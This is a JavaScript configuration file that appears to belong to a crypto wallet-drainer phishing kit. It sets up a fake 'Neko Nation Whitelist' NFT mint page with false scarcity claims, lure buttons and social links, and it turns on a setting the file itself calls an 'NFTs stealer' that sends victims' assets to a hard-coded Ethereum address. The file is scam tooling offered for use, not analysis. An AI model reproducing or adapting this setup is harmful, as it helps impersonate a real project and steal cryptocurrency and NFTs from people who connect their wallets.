const receiveAddress = "0xbd88f663F469Fd73D225586efc37605667aBd901";

const collectionInfo = {
    name: "Neko Nation Whitelist",
    socialMedia: {
        discord: "https://discord.com/invite/nekonationnft",
        twitter: "https://twitter.com/nekonation_NFT",
        instagram: "https://instagram.com",
    },
}

const indexPageInfo = {
    backgroundImage: "background.png", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "",
}

const claimPageInfo = {
    title: "779/760 SPOTS", // <br> is a line break
    shortDescription: "Spots data might not be up to date.",
    longDescription: "",

    claimButtonText: "JOIN WHITELIST",

    image: "ola.gif", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);